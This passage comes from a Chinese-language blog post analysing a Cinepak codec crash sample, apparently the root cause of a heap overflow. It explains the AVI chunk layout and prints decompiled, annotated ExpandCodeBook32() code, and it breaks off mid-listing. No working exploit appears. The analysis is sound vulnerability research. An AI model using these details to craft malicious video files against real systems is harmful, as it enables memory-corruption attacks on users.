href="https://wiki.multimedia.cx/index.php?title=Cinepak" target="_blank" rel="noopener">这里</a>找到。我分析时使用的是<code>样本</code><a href="http://samples.mplayerhq.hu/V-codecs/CVID/flicker/cvid-crash.avi" target="_blank" rel="noopener">cvid-crash.avi</a>。此样本的<code>实际视频数据块</code>，也就是<code>“movi”列表</code>，全部是由<code>“00dc”压缩视频帧数据块</code>和<code>“JUNK”块</code>构成。其中<code>“00dc”压缩视频帧数据块</code>中存放的数据就是经过<code>Cinepak视频编解码器</code>编码后的<code>视频帧数据</code>，每个<code>“00dc”压缩视频帧数据块</code>应该保存的是此视频<code>一帧的数据</code>。每个<code>“00dc”数据块</code>包含一个<code>“Frame Header”</code>和一个<code>“Strip”</code>。整个<code>“movi”列表</code>只包含一个<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>“00dc”数据块</code>，其余的<code>“00dc”数据块</code>中的<code>“Strip”</code>的<code>“Strip CVID ID”</code>都为<code>0x1100</code>。整个<code>“movi”列表</code>的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+--------+</span><br><span class="line">|      |        | 0x2000 | &lt;--- List of blocks in 12 bit V4 codebook</span><br><span class="line">| 00dc | 0x1000 | 0x2200 | &lt;--- List of blocks in 12 bit V1 codebook</span><br><span class="line">|      |        | 0x3000 | &lt;--- Vectors used to encode a frame</span><br><span class="line">+------+--------+--------+</span><br><span class="line">|      |        | 0x2100 | &lt;--- Selective list of blocks to update 12 bit V4 codebook</span><br><span class="line">| 00dc | 0x1100 | 0x2300 | &lt;--- Selective list of blocks to update 12 bit V1 codebook</span><br><span class="line">|      |        | 0x3100 | &lt;--- Selective set of vectors used to encode a frame</span><br><span class="line">+------+--------+--------+</span><br><span class="line">|      |        | 0x2100 | &lt;--- Selective list of blocks to update 12 bit V4 codebook</span><br><span class="line">| 00dc | 0x1100 | 0x2300 | &lt;--- Selective list of blocks to update 12 bit V1 codebook</span><br><span class="line">|      |        | 0x3100 | &lt;--- Selective set of vectors used to encode a frame</span><br><span class="line">+------+--------+--------+</span><br><span class="line">| .... |  ....  |  ....  |</span><br><span class="line">+------+--------+--------+</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>堆块数据区域</code>的<code>起始0x2000字节</code>的数据是从<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>中的<code>“CVID Chunk”</code>中的数据<code>解码后</code>得到的。这<code>0x2000字节</code>的数据的<code>前0x1000字节</code>数据是从<code>“CVID Chunk ID”</code>为<code>0x2000</code>的<code>“CVID Chunk”</code>中数据解码后得到的。<code>后0x1000字节</code>数据是从<code>“CVID Chunk ID”</code>为<code>0x2200</code>的<code>“CVID Chunk”</code>中数据解码后得到的。</p><p>&emsp;&emsp;这里的<code>“CVID Chunk ID”</code>为<code>0x2000</code>或<code>0x2200</code>的<code>“CVID Chunk”</code>还称为<code>CodeBooks</code>。<code>CodeBooks</code>中的内容是<code>CodeBooks向量</code>，在<code>12bpp模式</code>下，每个<code>CodeBooks向量</code>包含<code>4个8位亮度值</code>(luminance)和<code>2个子采样的8位色度值</code>(chrominance)，也就是<code>6字节</code>为一个<code>CodeBooks向量</code>。每个<code>CodeBooks</code>最多包含<code>256</code>个条目，所以一个<code>CodeBooks</code>最多包含256个<code>CodeBooks向量</code>。</p><p>&emsp;&emsp;当解码<code>“CVID Chunk ID”</code>为<code>0x2000</code>或<code>0x2200</code>的<code>CodeBooks</code>时，会调用<code>ExpandCodeBook32()</code>函数进行解码。<code>6字节</code>的<code>CodeBooks向量</code>会被解码为<code>16字节</code>数据。所以一个<code>CodeBooks</code>解码后的数据最大占用<code>256*16=4096=0x1000</code>字节。<code>ExpandCodeBook32()</code>函数经过逆向后的结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">stdcall <span class="title">ExpandCodeBook32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> CVID_Chunk_ID_Ptr, <span class="keyword">int</span> Heap_UserPtr, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *CVID_Chunk_ID_Ptr1; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v5; <span class="comment">// dx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> __int8 v11; <span class="comment">// al</span></span><br><span class="line">  __int16 v12; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  __int16 v14; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// al</span></span><br><span class="line">  __int16 v16; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// al</span></span><br><span class="line">  __int16 v18; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// al</span></span><br><span class="line">  __int16 v20; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// al</span></span><br><span class="line">  __int16 v22; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// al</span></span><br><span class="line">  __int16 v24; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// al</span></span><br><span class="line">  __int16 v26; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// al</span></span><br><span class="line">  __int16 v28; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// al</span></span><br><span class="line">  __int16 v30; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> __int8 v32; <span class="comment">// al</span></span><br><span class="line">  __int16 v33; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// ecx</span></span><br><span class="line">  __int16 v35; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// al</span></span><br><span class="line">  __int16 v37; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// al</span></span><br><span class="line">  __int16 v39; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// al</span></span><br><span class="line">  __int16 v41; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// al</span></span><br><span class="line">  __int16 v43; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// al</span></span><br><span class="line">  __int16 v45; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// al</span></span><br><span class="line">  __int16 v47; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v48; <span class="comment">// al</span></span><br><span class="line">  __int16 v49; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// al</span></span><br><span class="line">  __int16 v51; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v52; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v53; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v54; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v55; <span class="comment">// dl</span></span><br><span class="line">  _BYTE *v56; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> v57; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v58; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v59; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v61; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v62; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v63; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v64; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  CVID_Chunk_ID_Ptr1 = (<span class="keyword">unsigned</span> __int8 *)CVID_Chunk_ID_Ptr;</span><br><span class="line">  LOBYTE(v5) = <span class="number">0</span>;</span><br><span class="line">  HIBYTE(v5) = *(_WORD *)(CVID_Chunk_ID_Ptr + <span class="number">2</span>);<span class="comment">// Size of chunk data HByte,0x0600</span></span><br><span class="line">  v6 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int16 *)(CVID_Chunk_ID_Ptr + <span class="number">2</span>) &gt;&gt; <span class="number">8</span>;<span class="comment">// 0x0406-&gt;0x0004,Size of chunk data LByte</span></span><br><span class="line">  v7 = CVID_Chunk_ID_Ptr + <span class="number">4</span>;                   <span class="comment">// Chunk data</span></span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int8 *)(CVID_Chunk_ID_Ptr + <span class="number">4</span>);<span class="comment">// Chunk data</span></span><br><span class="line">  v64 = CVID_Chunk_ID_Ptr + <span class="number">4</span>;                  <span class="comment">// Chunk data</span></span><br><span class="line">  v9 = (v6 | v5) - <span class="number">4</span>;                           <span class="comment">// v9 = Size of chunk data - 4</span></span><br><span class="line">  v63 = CVID_Chunk_ID_Ptr + <span class="number">4</span>;                  <span class="comment">// Chunk data</span></span><br><span class="line">  CVID_Chunk_ID_Ptr = v9;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )                                     <span class="comment">// 判断chunk data长度是否为0</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *CVID_Chunk_ID_Ptr1;                   <span class="comment">// CVID_Chunk_ID_HByte</span></span><br><span class="line">    <span class="keyword">switch</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x22</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">6</span> )                          <span class="comment">// chunk data长度是否大于等于6字节(一个codebook vector的大小)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = (<span class="keyword">char</span> *)(Heap_UserPtr + <span class="number">2</span>);</span><br><span class="line">          <span class="comment">// 6字节codebook vector转换为16字节数据,堆缓冲区保存解压后的数据</span></span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">256</span> )                   <span class="comment">// codebooks最多包含256个codebook vector</span></span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            LOWORD(v7) = (<span class="keyword">char</span>)v8[<span class="number">5</span>];           <span class="comment">// 第6字节数据</span></span><br><span class="line">            v11 = v8[<span class="number">4</span>];                        <span class="comment">// 第5字节数据</span></span><br><span class="line">            v12 = v11;                          <span class="comment">// 第5字节数据</span></span><br><span class="line">            v64 = <span class="number">2</span> * v7;                       <span class="comment">// 第6字节数据*2</span></span><br><span class="line">            v13 = -v7 - v11 / <span class="number">2</span>;                <span class="comment">// -第6字节数据-第5字节数据/2</span></span><br><span class="line">            v14 = *v8;                          <span class="comment">// 第1字节数据</span></span><br><span class="line">            v12 *= <span class="number">2</span>;                           <span class="comment">// 第5字节数据*2</span></span><br><span class="line">            Heap_UserPtr = v13;</span><br><span class="line">            v15 = GetBounding24(v14 + v12 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v16 = Heap_UserPtr;</span><br><span class="line">            *(v10 - <span class="number">2</span>) = v15;                   <span class="comment">// 堆缓冲区第1字节</span></span><br><span class="line">            v17 = GetBounding24(*v8 + v16 + <span class="number">64</span>);<span class="comment">// 第1字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v18 = v64;</span><br><span class="line">            *(v10 - <span class="number">1</span>) = v17;                   <span class="comment">// 堆缓冲区第2字节</span></span><br><span class="line">            *v10 = GetBounding24(*v8 + v18 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第6字节数据*2+0x40,堆缓冲区第3字节</span></span><br><span class="line">            v19 = GetBounding24(v8[<span class="number">1</span>] + v12 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v20 = Heap_UserPtr;</span><br><span class="line">            v10[<span class="number">2</span>] = v19;                       <span class="comment">// 堆缓冲区第5字节</span></span><br><span class="line">            v21 = GetBounding24(v8[<span class="number">1</span>] + v20 + <span class="number">64</span>);<span class="comment">// 第2字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v22 = v64;</span><br><span class="line">            v10[<span class="number">3</span>] = v21;                       <span class="comment">// 堆缓冲区第6字节</span></span><br><span class="line">            v10[<span class="number">4</span>] = GetBounding24(v8[<span class="number">1</span>] + v22 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第6字节数据*2+0x40,堆缓冲区第7字节</span></span><br><span class="line">            v23 = GetBounding24(v8[<span class="number">2</span>] + v12 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v24 = Heap_UserPtr;</span><br><span class="line">            v10[<span class="number">6</span>] = v23;                       <span class="comment">// 堆缓冲区第9字节</span></span><br><span class="line">            v25 = GetBounding24(v8[<span class="number">2</span>] + v24 + <span class="number">64</span>);<span class="comment">// 第3字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v26 = v64;</span><br><span class="line">            v10[<span class="number">7</span>] = v25;                       <span class="comment">// 堆缓冲区第10字节</span></span><br><span class="line">            v10[<span class="number">8</span>] = GetBounding24(v8[<span class="number">2</span>] + v26 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第6字节数据*2+0x40,堆缓冲区第11字节</span></span><br><span class="line">            v27 = GetBounding24(v8[<span class="number">3</span>] + v12 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v28 = Heap_UserPtr;</span><br><span class="line">            v10[<span class="number">10</span>] = v27;                      <span class="comment">// 堆缓冲区第13字节</span></span><br><span class="line">            v29 = GetBounding24(v8[<span class="number">3</span>] + v28 + <span class="number">64</span>);<span class="comment">// 第4字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v30 = v64;</span><br><span class="line">            v10[<span class="number">11</span>] = v29;                      <span class="comment">// 堆缓冲区第14字节</span></span><br><span class="line">            LOBYTE(v6) = GetBounding24(v8[<span class="number">3</span>] + v30 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第6字节数据*2+0x40</span></span><br><span class="line">            v10[<span class="number">12</span>] = v6;                       <span class="comment">// 堆缓冲区第15字节</span></span><br><span class="line">            CVID_Chunk_ID_Ptr -= <span class="number">6</span>;             <span class="comment">// chunk data长度-6</span></span><br><span class="line">            v8 += <span class="number">6</span>;                            <span class="comment">// Chunk data指针+6</span></span><br><span class="line">            ++num;                              <span class="comment">// codebook vector计数器</span></span><br><span class="line">            v10 += <span class="number">16</span>;                          <span class="comment">// 堆缓冲区指针+16</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">6</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x21</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x23</span>:</span><br><span class="line">        <span class="comment">// 4字节Update Flags,[Update Flags中1的个数个codebook vector],4字节Update Flags,[Update Flags中1的个数个codebook vector]...</span></span><br><span class="line">        v61 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">6</span> )                          <span class="comment">// chunk data长度是否大于6字节(一个codebook vector的大小)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v31 = (<span class="keyword">char</span> *)(Heap_UserPtr + <span class="number">2</span>);</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">0x100</span> )                 <span class="comment">// codebooks最多包含256个codebook vector</span></span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v61 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v61 )                          <span class="comment">// v61第一次为0x0,第二次为0x80000000,第三次为0x40000000,第四次为0x20000000</span></span><br><span class="line">            &#123;</span><br><span class="line">              v6 = v61 &amp; v62;                   <span class="comment">// v62为swAdvance2()读出来的大端形式的数据</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 0x0,chunk data指针的指针,chunk data长度指针</span></span><br><span class="line">              v6 = swAdvance2(&amp;v61, (_BYTE **)&amp;v64, &amp;CVID_Chunk_ID_Ptr);<span class="comment">// chunk data的前四字节为一个flag</span></span><br><span class="line">              v8 = (<span class="keyword">unsigned</span> __int8 *)v64;      <span class="comment">// chunk data指针</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// chunk data四字节数据某一位不为0,chunk data长度&gt;=6</span></span><br><span class="line">            <span class="keyword">if</span> ( v6 &amp;&amp; CVID_Chunk_ID_Ptr &gt;= <span class="number">6</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 从chunk data+4开始,解析codebook vector</span></span><br><span class="line">              LOWORD(v7) = (<span class="keyword">char</span>)v8[<span class="number">5</span>];         <span class="comment">// 第6字节数据</span></span><br><span class="line">              v32 = v8[<span class="number">4</span>];                      <span class="comment">// 第5字节数据</span></span><br><span class="line">              v33 = v32;                        <span class="comment">// 第5字节数据</span></span><br><span class="line">              v64 = <span class="number">2</span> * v7;                     <span class="comment">// 第6字节数据*2</span></span><br><span class="line">              v34 = -v7 - v32 / <span class="number">2</span>;              <span class="comment">// -第6字节数据-第5字节数据/2</span></span><br><span class="line">              v35 = *v8;                        <span class="comment">// 第1字节数据</span></span><br><span class="line">              v33 *= <span class="number">2</span>;                         <span class="comment">// 第5字节数据*2</span></span><br><span class="line">              Heap_UserPtr = v34;</span><br><span class="line">              v36 = GetBounding24(v35 + v33 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v37 = Heap_UserPtr;</span><br><span class="line">              *(v31 - <span class="number">2</span>) = v36;                 <span class="comment">// 堆缓冲区第0x10*num+1字节</span></span><br><span class="line">              v38 = GetBounding24(*v8 + v37 + <span class="number">64</span>);<span class="comment">// 第1字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v39 = v64;</span><br><span class="line">              *(v31 - <span class="number">1</span>) = v38;                 <span class="comment">// 堆缓冲区第0x10*num+2字节</span></span><br><span class="line">              *v31 = GetBounding24(*v8 + v39 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第6字节数据*2+0x40,堆缓冲区第0x10*num+3字节</span></span><br><span class="line">              v40 = GetBounding24(v8[<span class="number">1</span>] + v33 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v41 = Heap_UserPtr;</span><br><span class="line">              v31[<span class="number">2</span>] = v40;                     <span class="comment">// 堆缓冲区第0x10*num+5字节</span></span><br><span class="line">              v42 = GetBounding24(v8[<span class="number">1</span>] + v41 + <span class="number">64</span>);<span class="comment">// 第2字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v43 = v64;</span><br><span class="line">              v31[<span class="number">3</span>] = v42;                     <span class="comment">// 堆缓冲区第0x10*num+6字节</span></span><br><span class="line">              v31[<span class="number">4</span>] = GetBounding24(v8[<span class="number">1</span>] + v43 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第6字节数据*2+0x40,堆缓冲区第0x10*num+7字节</span></span><br><span class="line">              v44 = GetBounding24(v8[<span class="number">2</span>] + v33 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v45 = Heap_UserPtr;</span><br><span class="line">              v31[<span class="number">6</span>] = v44;                     <span class="comment">// 堆缓冲区第0x10*num+9字节</span></span><br><span class="line">              v46 = GetBounding24(v8[<span class="number">2</span>] + v45 + <span class="number">64</span>);<span class="comment">// 第3字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v47 = v64;</span><br><span class="line">              v31[<span class="number">7</span>] = v46;                     <span class="comment">// 堆缓冲区第0x10*num+10字节</span></span><br><span class="line">              v31[<span class="number">8</span>] = GetBounding24(v8[<span class="number">2</span>] + v47 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第6字节数据*2+0x40,堆缓冲区第0x10*num+11字节</span></span><br><span class="line">              v48 = GetBounding24(v8[<span class="number">3</span>] + v33 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v49 = Heap_UserPtr;</span><br><span class="line">              v31[<span class="number">10</span>] = v48;                    <span class="comment">// 堆缓冲区第0x10*num+13字节</span></span><br><span class="line">              v50 = GetBounding24(v8[<span class="number">3</span>] + v49 + <span class="number">64</span>);<span class="comment">// 第4字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v51 = v64;</span><br><span class="line">              v31[<span class="number">11</span>] = v50;                    <span class="comment">// 堆缓冲区第0x10*num+14字节</span></span><br><span class="line">              LOBYTE(v6) = GetBounding24(v8[<span class="number">3</span>] + v51 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第6字节数据*2+0x40</span></span><br><span class="line">              v31[<span class="number">12</span>] = v6;                     <span class="comment">// 堆缓冲区第0x10*num+15字节</span></span><br><span class="line">              CVID_Chunk_ID_Ptr -= <span class="number">6</span>;           <span class="comment">// chunk data长度-6</span></span><br><span class="line">              v8 += <span class="number">6</span>;                          <span class="comment">// Chunk data指针+6</span></span><br><span class="line">              v64 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8;           <span class="comment">// chunk data指针</span></span><br><span class="line">            &#125;</span><br><span class="line">  